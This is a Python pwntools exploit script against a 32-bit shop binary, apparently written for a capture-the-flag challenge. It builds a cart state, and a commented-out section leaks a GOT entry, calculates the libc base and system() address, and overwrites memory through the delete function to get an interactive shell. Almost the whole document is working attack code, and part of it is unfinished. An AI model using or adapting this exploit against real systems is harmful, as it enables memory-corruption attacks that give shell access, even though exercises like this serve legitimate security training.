#!/usr/bin/env python 

from pwn import *
import time

LOCAL = True
Debug = True

lib = ELF('./libc.so.6.32')

def L(msg):
    if Debug:
        print msg

if not LOCAL:
    r = remote('172.16.113.50', 12020)
else:
    r = process('./shop2')
    L(r.proc.pid)
    a = raw_input('Wait gdb attach...\n')



'''
 Arch:     i386-32-little
 RELRO:    Partial RELRO
 Stack:    Canary found
 NX:       NX enabled
 PIE:      No PIE (0x8048000)
'''

def add(device_number):
    L(r.recvuntil('>'))
    r.send('2')
    L(r.recvuntil('>'))
    r.send(device_number)

def checkout(s):
    L(r.recvuntil('>'))
    r.send('5')
    L(r.recvuntil('>'))
    r.send(s)    
    
def cart(s):
    L(r.recvuntil('>'))
    r.send('4')
    L(r.recvuntil('>'))
    r.send(s)
    
def delete(number):
    L(r.recvuntil('>'))
    r.send('3')
    L(r.recvuntil('>'))
    r.send(number)

    

if __name__ == "__main__":
    
    atoi_plt = 0x804b040
    
    # 399*10 + 199*16 = 7174
    for i in range(16):
        add('1')
    for i in range(10):
        add('4')
    checkout('y')
    
    '''
    cart('y '+ p32(atoi_plt) + p32(1) + p32(0)*2)

    # count the addr of system    
    res = r.recvuntil('>')
    L(res)
    atoi_add = res.split('27: ')[1].split(' -')[0]
    atoi_add = u32(atoi_add.ljust(4,'\x00'))
    lib_base =  atoi_add - lib.symbols['atoi']
    sys_add = lib_base + lib.symbols['system']
    print 'atoi_addr =', hex(atoi_add)
    print 'system_addr =', hex(sys_add)
            
    delete('27'+ p32(0)*2 + p32(atoi_add-0x8) + p32(sys_add)
    # 27 333333333333333333
    # --1234123412341234xxx
     '''
    L(r.proc.pid)    
    r.interactive()



